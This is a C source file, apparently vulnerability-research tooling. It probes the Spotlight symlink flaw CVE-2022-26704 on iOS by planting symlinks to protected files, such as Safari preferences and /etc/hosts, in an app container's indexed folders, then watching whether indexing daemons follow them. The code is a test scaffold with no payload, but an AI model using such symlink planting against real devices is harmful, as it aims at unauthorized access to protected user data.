/*
 * spotlight_symlink_scaffold.c — SCAFFOLD, not an exploit.
 *
 * Target : CVE-2022-26704 (Spotlight symlink validation)
 * Theory : a Spotlight importer or indexing daemon follows a symlink placed
 *          in an app container with `stat` + `open` instead of `lstat` +
 *          `open(O_NOFOLLOW)`, so the privileged importer reads/writes a
 *          protected target.
 * Status : behavioural test; no offsets needed. The signal is whether the
 *          symlink target is accessed by a system process on 27.0.1.
 *
 * Build  : xcrun -sdk iphoneos clang -arch arm64 spotlight_symlink_scaffold.c -o spot_sym
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <errno.h>

/* Candidate protected targets that a mistaken importer might touch. */
static const char *targets[] = {
    "/private/var/mobile/Library/Preferences/com.apple.mobilesafari.plist",
    "/private/var/mobile/Library/Preferences/.GlobalPreferences.plist",
    "/private/var/db/timezone/localtime",
    "/etc/hosts",
};

/* Candidate container locations that Spotlight indexes. */
static const char *index_dirs[] = {
    "Documents",
    "Library/Mobile Documents",
    "Library/Caches",
    "tmp",
};

/* File extensions likely to select a metadata importer. */
static const char *exts[] = {
    "heic", "jpg", "pdf", "mov", "mp3", "usdz", "ics", "eml", "txt", "plist",
};

static int is_indexed(const char *path) {
    /* Heuristic: the file lives under the app's container. */
    return strstr(path, "Containers/Data/Application") != NULL;
}

int main(void) {
    char home[1024];
    const char *h = getenv("HOME");
    if (!h) { fprintf(stderr, "[-] no HOME\n"); return 1; }
    snprintf(home, sizeof(home), "%s", h);

    int created = 0;
    for (size_t d = 0; d < sizeof(index_dirs) / sizeof(index_dirs[0]); d++) {
        char dir[1200];
        snprintf(dir, sizeof(dir), "%s/%s", home, index_dirs[d]);
        mkdir(dir, 0755);
        if (!is_indexed(dir)) continue;

        for (size_t t = 0; t < sizeof(targets) / sizeof(targets[0]); t++) {
            for (size_t e = 0; e < sizeof(exts) / sizeof(exts[0]); e++) {
                char link[1400];
                snprintf(link, sizeof(link), "%s/scaffold_%zu.%s",
                         dir, t * 16 + e, exts[e]);
                unlink(link);
                if (symlink(targets[t], link) == 0) {
                    created++;
                    printf("[*] symlink %s -> %s\n", link, targets[t]);
                }
            }
        }
    }

    printf("[*] created %d symlinks; waiting for Spotlight to index...\n",
           created);
    printf("[*] observe with: log stream --predicate "
           "'process == \"mdworker\" or process == \"mds\"'\n");
    printf("[*] and: fs_usage -w -f filesys | grep scaffold_\n");
    sleep(120);
    return 0;
}
